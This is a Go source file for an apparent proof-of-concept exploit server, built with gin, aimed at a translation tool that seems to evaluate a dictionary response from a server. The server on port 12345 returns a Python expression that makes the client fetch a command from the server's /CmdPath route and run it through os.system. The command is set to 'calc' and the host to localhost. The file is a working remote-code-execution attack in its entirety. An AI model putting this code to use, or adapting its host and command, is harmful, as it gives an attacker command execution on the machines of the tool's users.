package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
)

const IP_DOMAIN = "localhost"
const CMD = "calc"

func getPayload() string {
	var payload_1 string = "__import__('urllib.request').request.urlopen('http://" + IP_DOMAIN + ":12345/DangoTranslate/ShowDict').read().decode('utf-8')"
	var payload_2 string = "__import__('urllib.request').request.urlopen('http://" + IP_DOMAIN + ":12345/CmdPath').read().decode('utf-8')"
	var final_payload string = payload_1 + " + ('' if __import__('os').system(" + payload_2 + ") else '')"
	return final_payload
}

func main() {
	gin.SetMode(gin.ReleaseMode)
	Router := gin.Default()
	Router.Any("/DangoTranslate/ShowDict", func(Data *gin.Context) {
		fmt.Println("[REMOTE]Ip: {" + Data.ClientIP() + "} Has Connected To Test Path, return command soon")

		Data.Data(200, "application/json; charset=utf-8", []byte(getPayload()))
	})
	Router.Any("/CmdPath", func(Data *gin.Context) {
		fmt.Println("[REMOTE]Ip: {" + Data.ClientIP() + "} Performing Cmd: " + CMD)
		Data.Data(200, "application/json; charset=utf-8", []byte(CMD))
	})
	Router.Run(":12345")
}
